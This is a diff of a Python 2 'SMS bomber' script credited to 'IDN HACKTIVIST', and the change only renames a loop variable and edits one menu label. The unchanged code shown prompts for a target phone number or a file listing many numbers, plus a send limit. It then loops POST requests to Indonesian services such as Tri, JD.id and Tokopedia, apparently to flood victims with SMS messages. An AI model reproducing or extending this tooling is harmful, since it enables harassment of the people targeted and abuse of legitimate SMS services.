@@ -6,8 +6,8 @@ if 'Windows' in platform.system():
 else:
     ua = {'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/65.0.3325.181 Chrome/65.0.3325.181 Safari/537.36'}
 
-ulang = ''
-while ulang != 'n' :
+ulangi = ''
+while ulangi != 'n' :
     print """
  ._________________.
  | _______________ |
@@ -30,7 +30,7 @@ while ulang != 'n' :
 # Team   : IDN HACKTIVIST              #
 ########################################
      """
-    print "1) Sms Tri"
+    print "1) Sms 3(tri)"
     print "2) Sms JD.id"
     print "3) Sms Phd.id"
     print "4) Sms Tokoepedia"
@@ -49,7 +49,7 @@ while ulang != 'n' :
             req = urllib2.Request(url,data=data_post,headers=ua)
             res = urllib2.urlopen(req)
             print res.read().decode('utf-8')
-        ulang = raw_input('Ulang (y/n) :')
+        ulangi = raw_input('Ulang (y/n) :')
     elif pilihan == 2:
         number = raw_input('Target (ex:628999888):')
         limit = input('Limit :')
@@ -60,7 +60,7 @@ while ulang != 'n' :
             req = urllib2.Request(url,data=data_post,headers=ua)
             res = urllib2.urlopen(req)
             print res.read().decode('utf-8')
-        ulang = raw_input('Ulang (y/n) :')
+        ulangi = raw_input('Ulang (y/n) :')
     elif pilihan == 3:
         number = raw_input('Target (ex:628999888):')
         limit = input('Limit :')
@@ -71,7 +71,7 @@ while ulang != 'n' :
             req = urllib2.Request(url,data=data_post,headers=ua)
             res = urllib2.urlopen(req)
             print res.read().decode('utf-8')
-        ulang = raw_input('Ulang (y/n) :')
+        ulangi = raw_input('Ulang (y/n) :')
     elif pilihan == 4:
         number = raw_input('Target (ex:628999888):')
         limit = input('Limit :')
@@ -82,7 +82,7 @@ while ulang != 'n' :
             req = urllib2.Request(url,data=data_post,headers=ua)
             res = urllib2.urlopen(req)
             print res.read().decode('utf-8')
-        ulang = raw_input('Ulang (y/n) :')
+        ulangi = raw_input('Ulang (y/n) :')
     elif pilihan == 5:
         print "1) Single"
         print "2) List"
@@ -95,7 +95,7 @@ while ulang != 'n' :
             req = urllib2.Request(url,data=data_post,headers=ua)
             res = urllib2.urlopen(req)
             print res.read().decode('utf-8')
-            ulang = raw_input('Ulang (y/n) :')
+            ulangi = raw_input('Ulang (y/n) :')
         elif opsi == 2:
             list_number = raw_input('List Target :')
             numbers = open(list_number,'r').read().splitlines()
@@ -106,7 +106,7 @@ while ulang != 'n' :
                 req = urllib2.Request(url,data=data_post,headers=ua)
                 res = urllib2.urlopen(req)
                 print res.read().decode('utf-8')
-            ulang = raw_input('Ulang (y/n) :')    
+            ulangi = raw_input('Ulang (y/n) :')    
         else :
             print "\n Nothing"
             exit()
